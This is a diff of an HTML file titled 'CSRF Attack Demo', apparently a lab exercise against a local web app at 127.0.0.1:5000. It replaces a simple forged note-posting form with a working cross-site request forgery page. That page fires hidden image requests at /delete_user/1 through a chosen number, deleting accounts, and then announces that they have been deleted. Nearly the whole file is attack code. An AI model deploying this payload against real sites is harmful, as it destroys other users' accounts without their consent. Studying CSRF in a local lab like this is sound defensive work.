@@ -1,4 +1,28 @@
-<form action="http://127.0.0.1:5000/notes" method="POST">
-  <input type="hidden" name="note" value="CSRF ATTACK">
-  <input type="submit" value="Submit">
-</form>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack Demo</title>
+  <script>
+    // Asks how many users to delete
+    const count = prompt("Which account indexes do you want to delete (1 to ?)", "1");
+
+    window.onload = () => {
+      const container = document.getElementById("attack-container");
+      for (let i = 1; i <= count; i++) {
+        const img = document.createElement("img");
+        img.src = `http://127.0.0.1:5000/delete_user/${i}`;
+        img.style.display = "none";
+        container.appendChild(img);
+      }
+
+      setTimeout(() => {
+        document.getElementById("message").innerText = `Accounts indexes between 1 and ${count} have been deleted.`;
+      }, 2000);
+    };
+  </script>
+</head>
+<body>
+  <h1 id="message">Program under attack...</h1>
+  <div id="attack-container"></div>
+</body>
+</html>
